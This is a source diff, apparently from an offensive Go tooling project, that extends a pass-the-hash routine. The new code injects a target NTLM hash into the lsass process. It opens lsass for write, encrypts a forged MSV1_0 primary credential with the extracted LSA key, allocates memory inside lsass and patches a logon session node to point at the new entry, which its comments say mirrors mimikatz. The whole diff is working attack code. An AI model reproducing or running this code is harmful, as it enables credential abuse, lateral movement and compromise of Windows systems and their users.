@@ -4,6 +4,7 @@ package sekurlsa
 
 import (
 	"bytes"
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"os"
@@ -141,44 +142,8 @@ func writeBackMSV(res *PTHResult, p PTHParams) error {
 	}
 	res.Warnings = append(res.Warnings, parsed.Warnings...)
 
-	target := findMSVForLUID(parsed, res.LogonID)
-	if target == nil {
-		// LUID may be present but with empty MSV PrimaryCredentials
-		// (CipherVA=0). This is the NETCREDENTIALS_ONLY case: the
-		// session exists in the MSV LIST_ENTRY but no encrypted
-		// credential blob is attached because no local auth ran.
-		// Mimikatz handles this by allocating fresh memory in lsass
-		// for a new PrimaryCredentials_data and patching the session
-		// node's CredentialsOffset — that's the chantier-II final
-		// slice (allocation fallback + Kerberos KERB_HASHPASSWORD
-		// write-back). The error surfaces enough context for the
-		// operator to know whether the LUID is missing entirely or
-		// just lacks an MSV cipher.
-		empty := false
-		for _, s := range parsed.Sessions {
-			if s.LUID != res.LogonID {
-				continue
-			}
-			for _, c := range s.Credentials {
-				if _, ok := c.(*MSVCredential); ok {
-					empty = true
-					break
-				}
-			}
-			break
-		}
-		if empty {
-			return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
-				"LUID 0x%X has empty MSV PrimaryCredentials (CipherVA=0) — likely NETCREDENTIALS_ONLY-spawned; allocation-fallback path is queued for the next chantier-II slice",
-				res.LogonID))
-		}
-		return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
-			"LUID 0x%X not found among %d MSV sessions",
-			res.LogonID, len(parsed.Sessions)))
-	}
-
-	// 4-6. Open lsass for write, NtRead live cipher, decrypt +
-	// mutate + encrypt, NtWrite.
+	// Open lsass for write — needed by both the in-place overwrite
+	// and the allocation fallback path.
 	lsassPID, err := lsassdump.LsassPID(p.Caller)
 	if err != nil {
 		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("LsassPID: %w", err))
@@ -191,34 +156,200 @@ func writeBackMSV(res *PTHResult, p PTHParams) error {
 	}
 	defer windows.CloseHandle(hWrite)
 
-	live := make([]byte, target.CipherLen)
-	if err := ntReadVirtualMemory(hWrite, uintptr(target.CipherVA), live, p.Caller); err != nil {
-		return errors.Join(ErrPTHWriteFailed,
-			fmt.Errorf("NtReadVirtualMemory @0x%X: %w", target.CipherVA, err))
+	target := findMSVForLUID(parsed, res.LogonID)
+	if target != nil {
+		// In-place overwrite path: matching session has an existing
+		// encrypted PrimaryCredentials blob — read it live, decrypt,
+		// mutate the hashes, re-encrypt, write back at the same VA.
+		live := make([]byte, target.CipherLen)
+		if err := ntReadVirtualMemory(hWrite, uintptr(target.CipherVA), live, p.Caller); err != nil {
+			return errors.Join(ErrPTHWriteFailed,
+				fmt.Errorf("NtReadVirtualMemory @0x%X: %w", target.CipherVA, err))
+		}
+		plain, err := decryptLSA(live, parsed.lsaKey)
+		if err != nil {
+			return errors.Join(ErrPTHWriteFailed, fmt.Errorf("decryptLSA: %w", err))
+		}
+		mutated, err := mutateMSVPrimary(plain, p.Target)
+		if err != nil {
+			return err
+		}
+		fresh, err := encryptLSA(mutated, parsed.lsaKey)
+		if err != nil {
+			return errors.Join(ErrPTHWriteFailed, fmt.Errorf("encryptLSA: %w", err))
+		}
+		if len(fresh) != len(live) {
+			return errors.Join(ErrPTHWriteFailed,
+				fmt.Errorf("post-encrypt length mismatch %d != %d (would corrupt MSV layout)",
+					len(fresh), len(live)))
+		}
+		if err := ntWriteVirtualMemory(hWrite, uintptr(target.CipherVA), fresh, p.Caller); err != nil {
+			return errors.Join(ErrPTHWriteFailed,
+				fmt.Errorf("NtWriteVirtualMemory @0x%X: %w", target.CipherVA, err))
+		}
+		res.MSVOverwritten = true
+		return nil
 	}
-	plain, err := decryptLSA(live, parsed.lsaKey)
-	if err != nil {
-		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("decryptLSA: %w", err))
+
+	// Allocation fallback: matching session exists in the MSV
+	// LIST_ENTRY but has no encrypted PrimaryCredentials attached
+	// (CipherVA=0 — the NETCREDENTIALS_ONLY case). Mirror mimikatz'
+	// PTH-via-allocation: NtAllocateVirtualMemory in lsass for a
+	// fresh PrimaryCredentials_data list entry + encrypted
+	// MSV1_0_PRIMARY_CREDENTIAL blob, then patch the session node's
+	// CredentialsOffset field to point at the new entry.
+	matchingSession := findSessionByLUID(parsed, res.LogonID)
+	if matchingSession == nil {
+		return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
+			"LUID 0x%X not found among %d MSV sessions",
+			res.LogonID, len(parsed.Sessions)))
 	}
-	mutated, err := mutateMSVPrimary(plain, p.Target)
-	if err != nil {
-		return err // already wraps ErrPTHWriteFailed
+	if matchingSession.MSVNodeVA == 0 {
+		// LUID landed via a non-MSV walker (Kerberos / Wdigest /
+		// CloudAP merge) — no MSV LIST_ENTRY node exists yet for the
+		// spawned session. Allocation fallback can't run without a
+		// node to patch. Surface as ErrPTHNoMatchingLUID so the
+		// graceful-skip wiring in tests catches this exact case.
+		return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
+			"LUID 0x%X session present (via non-MSV walker) but has no MSV LIST_ENTRY — allocation fallback requires an MSV node to patch",
+			res.LogonID))
 	}
-	fresh, err := encryptLSA(mutated, parsed.lsaKey)
-	if err != nil {
-		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("encryptLSA: %w", err))
+	tmpl := templateFor(parsed.BuildNumber)
+	if tmpl == nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf(
+			"no Template for build %d (allocation path needs MSVLayout offsets)",
+			parsed.BuildNumber))
 	}
-	if len(fresh) != len(live) {
-		return errors.Join(ErrPTHWriteFailed,
-			fmt.Errorf("post-encrypt length mismatch %d != %d (would corrupt MSV layout)",
-				len(fresh), len(live)))
-	}
-	if err := ntWriteVirtualMemory(hWrite, uintptr(target.CipherVA), fresh, p.Caller); err != nil {
-		return errors.Join(ErrPTHWriteFailed,
-			fmt.Errorf("NtWriteVirtualMemory @0x%X: %w", target.CipherVA, err))
+	if err := allocateAndAttachMSVPrimary(hWrite, matchingSession, tmpl, parsed.lsaKey, p); err != nil {
+		return err
 	}
 	res.MSVOverwritten = true
 	return nil
+}
+
+// findSessionByLUID returns the LogonSession whose LUID matches; or
+// nil. Companion to findMSVForLUID — used by the allocation fallback
+// when there's no MSVCredential with a non-zero CipherVA (i.e. the
+// session has no existing PrimaryCredentials blob to overwrite).
+func findSessionByLUID(parsed *Result, luid uint64) *LogonSession {
+	for i := range parsed.Sessions {
+		if parsed.Sessions[i].LUID == luid {
+			return &parsed.Sessions[i]
+		}
+	}
+	return nil
+}
+
+// allocateAndAttachMSVPrimary builds a fresh MSV PrimaryCredentials
+// list entry + encrypted credential blob in the lsass address space
+// and patches the session node's CredentialsOffset field to point at
+// it. Mirrors mimikatz' PTH-via-allocation when the spawned session
+// (NETCREDENTIALS_ONLY) has no existing creds to overwrite.
+//
+// Layout of the single allocation (header + cipher contiguous):
+//
+//	+0x00  Flink uint64                 — points to itself
+//	+0x08  Blink uint64                 — points to itself
+//	+0x10  Primary UNICODE_STRING (16)  — empty (Length=0, Buffer=nil)
+//	+0x20  Credentials UNICODE_STRING:
+//	         +0x20  Length    uint16   = cipherLen
+//	         +0x22  MaxLength uint16   = cipherLen
+//	         +0x24  pad       uint32   = 0
+//	         +0x28  Buffer    uint64   = base + 0x30
+//	+0x30  Encrypted MSV1_0_PRIMARY_CREDENTIAL bytes (cipherLen)
+//
+// The encrypted plaintext is a 0x60-byte struct with empty
+// Domain/UserName UNICODE_STRINGs (the outer session node already
+// carries them) and the target's NTLM at +0x20 + zero LM at +0x30 +
+// zero SHA1 at +0x40 — same field layout parseMSVPrimary expects.
+func allocateAndAttachMSVPrimary(hLsass windows.Handle, session *LogonSession, tmpl *Template, lsaKey *lsaKey, p PTHParams) error {
+	// Build the plaintext with the target's NT hash, padded up to a
+	// 16-byte boundary so encryptLSA picks AES (lsasrv expects an
+	// AES-encrypted blob; the unaligned 0x54 size would fall into
+	// the 3DES branch which lsasrv won't recognize on Win10/11).
+	const plainSize = (msvPrimaryWithSHA1End + 15) &^ 15 // 0x60
+	plain := make([]byte, plainSize)
+	copy(plain[msvPrimaryNTHashOffset:msvPrimaryLMHashOffset], p.Target.NTLM)
+	// LM + SHA1 stay zero. 0x54..0x60 is alignment padding (zero).
+
+	cipher, err := encryptLSA(plain, lsaKey)
+	if err != nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("encryptLSA(new MSV primary): %w", err))
+	}
+	cipherLen := uint16(len(cipher))
+
+	const headerSize = 0x30
+	totalSize := headerSize + len(cipher)
+
+	// 1. NtAllocateVirtualMemory in lsass.
+	base, err := ntAllocateInProcess(hLsass, uintptr(totalSize), p.Caller)
+	if err != nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("NtAllocateVirtualMemory: %w", err))
+	}
+
+	// 2. Build the entry header bytes.
+	buf := make([]byte, totalSize)
+	// Flink = Blink = base (self-referential single-entry list).
+	binary.LittleEndian.PutUint64(buf[0x00:0x08], uint64(base))
+	binary.LittleEndian.PutUint64(buf[0x08:0x10], uint64(base))
+	// Primary UNICODE_STRING at +0x10 — left zeroed (empty).
+	// Credentials UNICODE_STRING at +0x20:
+	binary.LittleEndian.PutUint16(buf[0x20:0x22], cipherLen)             // Length
+	binary.LittleEndian.PutUint16(buf[0x22:0x24], cipherLen)             // MaxLength
+	binary.LittleEndian.PutUint64(buf[0x28:0x30], uint64(base)+headerSize) // Buffer
+	// Cipher follows at +0x30.
+	copy(buf[headerSize:], cipher)
+
+	// 3. NtWriteVirtualMemory the whole 0x90 buffer.
+	if err := ntWriteVirtualMemory(hLsass, base, buf, p.Caller); err != nil {
+		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("NtWriteVirtualMemory(new entry): %w", err))
+	}
+
+	// 4. Patch the session node's CredentialsOffset field to point
+	// at the new list entry.
+	credOffsetVA := uintptr(session.MSVNodeVA) + uintptr(tmpl.MSVLayout.CredentialsOffset)
+	var ptr [8]byte
+	binary.LittleEndian.PutUint64(ptr[:], uint64(base))
+	if err := ntWriteVirtualMemory(hLsass, credOffsetVA, ptr[:], p.Caller); err != nil {
+		return errors.Join(ErrPTHWriteFailed,
+			fmt.Errorf("NtWriteVirtualMemory(node.CredentialsOffset @0x%X): %w", credOffsetVA, err))
+	}
+	return nil
+}
+
+// ntAllocateInProcess wraps NtAllocateVirtualMemory with the standard
+// PTH allocation params: address=0 (let the kernel pick), zero bits=0,
+// MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE. Returns the base VA in the
+// target process.
+func ntAllocateInProcess(h windows.Handle, size uintptr, caller *wsyscall.Caller) (uintptr, error) {
+	var base uintptr
+	regionSize := size
+	var r uintptr
+	if caller != nil {
+		rr, _ := caller.Call("NtAllocateVirtualMemory",
+			uintptr(h),
+			uintptr(unsafe.Pointer(&base)),
+			0,
+			uintptr(unsafe.Pointer(&regionSize)),
+			windows.MEM_COMMIT|windows.MEM_RESERVE,
+			windows.PAGE_READWRITE,
+		)
+		r = rr
+	} else {
+		rr, _, _ := api.ProcNtAllocateVirtualMemory.Call(
+			uintptr(h),
+			uintptr(unsafe.Pointer(&base)),
+			0,
+			uintptr(unsafe.Pointer(&regionSize)),
+			windows.MEM_COMMIT|windows.MEM_RESERVE,
+			windows.PAGE_READWRITE,
+		)
+		r = rr
+	}
+	if r != 0 {
+		return 0, fmt.Errorf("NTSTATUS 0x%X", uint32(r))
+	}
+	return base, nil
 }
 
 // findMSVForLUID scans parsed.Sessions for the LUID and returns the
